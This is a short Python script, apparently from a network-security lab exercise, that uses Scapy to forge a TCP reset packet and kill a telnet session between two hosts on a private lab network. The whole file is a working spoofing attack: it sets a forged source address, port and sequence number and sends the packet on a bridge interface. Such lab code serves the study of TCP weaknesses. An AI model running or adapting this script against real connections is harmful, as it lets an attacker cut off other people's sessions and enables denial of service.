#!/usr/bin/env python3
from scapy.all import *
print("TCP RST Attack on Telnet Connection")
ip  = IP(src="10.9.0.6", dst="10.9.0.5") #Src IP is User1's IP and dst IP is victim's IP
tcp = TCP(sport=51704, dport=23, flags="R", seq=1350984062) #source port of the most recent TCP packet sent; Destination port 23 means telnet; Flag R means reset flag; seqeunce number of most recent TCP packet
pkt = ip/tcp
ls(pkt)
send(pkt,iface='br-c83e1ac99060', verbose=0)
